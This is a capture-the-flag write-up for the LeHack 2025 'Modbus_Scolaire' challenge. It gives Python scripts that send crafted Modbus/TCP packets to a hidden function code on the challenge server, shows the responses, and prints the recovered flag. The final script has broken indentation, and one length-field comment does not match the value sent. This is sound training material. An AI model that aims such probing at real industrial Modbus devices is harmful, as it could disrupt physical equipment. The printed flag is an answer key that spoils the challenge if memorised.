# LeHack 2025 Wargame modbus_scolaire writeup
This is my writeup for the LeHack Wargame 2025 challenge Modbus_Scolaire.

## Challenge description
Un unprotected modbus server is freely responding on the network. Can you break it? Flag format : LeHACK{the_flag}

Basic modbus packets will look like this :

    \x00\x01 Transaction ID
    \x00\x00 Protocol ID
    \x00\x0A Length: 10 bytes after this field
    \x01 Unit ID

-> Function code : 1 byte

-> Payload : the rest

modbus_scolaire.wargame.rocks:1502

Direct bruteforce is not recommended : the amount of combinations is above 10^{12} and we close at 8:00 AM

## Google what a function code does
Modbus function codes are 8 bit long numerical identifiers that dictate the specific operations performed by a Modbus device. These codes instruct the slave device on actions like reading or writing data to coils or registers. They are part of the Protocol Data Unit (PDU) within a Modbus message. 
Modbus has these common function codes:
| Function Code | Description             |
|---------------|-------------------------|
| 0x01          | Read Coils              |
| 0x02          | Read Discrete Inputs    |
| 0x03          | Read Holding Registers  |
| 0x04          | Read Input Registers    |
| 0x05          | Write Single Coil       |
| 0x06          | Write Single Register   |
| 0x0F          | Write Multiple Coils    |

## Communicate with modbus server

Start by initiating normal contact

  ```python
import socket
  
HOST = 'modbus_scolaire.wargame.rocks'
PORT = 1502

packet = (
    b'\x00\x01'  # Transaction ID
    b'\x00\x00'  # Protocol ID
    b'\x00\x0A'  # Length (10 bytes after this)
    b'\x01'      # Unit ID
    b'\x01'      # Function Code: Read Coils
)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(packet)
    data = s.recv(1024)
    print("Received:", data)
```
Response:
`Ack`
--> Cool, modbus notices us.
Loop through all of the function codes and realise this is not the way, everything only gives back `Ack`. 
Try out funny numbers as function code like `\x69` or `\x42`.
`\x42` actually changes the response to `func42............`!
Progress!

## Prepare different payloads
So we know the rest of the payload is 8 bits long, let's prepare a list of payloads!
  ```python
import socket

HOST = 'modbus_scolaire.wargame.rocks'
PORT = 1502

test_payloads = [
    b'\x00\x00\x00\x01\x00\x00\x00\x00',  # read 1 register at 0
    b'\x00\x00\x00\x08\x00\x00\x00\x00',  # read 8 registers at 0
    b'\x13\x37\x00\x01\x00\x00\x00\x00',  # leet + read 1
    b'\xDE\xAD\xBE\xEF\x00\x00\x00\x01',  # hex magic

]

for payload in test_payloads:
    packet = (
        b'\x00\x01' +               # Transaction ID
        b'\x00\x00' +               # Protocol ID
        b'\x00\xFF' +               # Length (10 bytes after this field)
        b'\x01' +                   # Unit ID
        b'\x42' +                   # Function code 0x42
        payload                     # 8 bytes payload
    )

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(packet)
        data = s.recv(1024)
        print(f"Sent payload: {payload} | Received: {data}")

```

Responses
```shell

Sent payload: b'\x00\x00\x00\x01\x00\x00\x00\x00' | Received: b'func42............\n'
Sent payload: b'\x00\x00\x00\x08\x00\x00\x00\x00' | Received: b'func42............\n'
Sent payload: b'\x13\x37\x00\x01\x00\x00\x00\x00' | Received: b'func421955......\n'
Sent payload: b'\xde\xad\xbe\xef\x00\x00\x00\x01' | Received: b'func42......190239\n'
```
Oh hello there, seems like we're halfway there.

## Combine the working payloads to one
Try around different variations of payload until you're sure that the relevant parts are `\x13\x37\` and `\xBE\xEF`

## Final working file
```python
import socket

HOST = 'modbus_scolaire.wargame.rocks'
PORT = 1502

payload = b'\x13\x37\xBE\xEF\x01\x00\x00\x00'


  packet = (
      b'\x00\x01' +               # Transaction ID
      b'\x00\x00' +               # Protocol ID
      b'\x00\xFF' +               # Length (10 bytes after this field)
      b'\x01' +                   # Unit ID
      b'\x42' +                   # Function code 0x42
      payload                     # 8 bytes payload
  )

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(packet)
        data = s.recv(1024)
        print(f"Sent payload: {payload} | Received: {data}")

```
Enjoy your flag `LeHACK{unsafe_modbus_packets_4_win}`
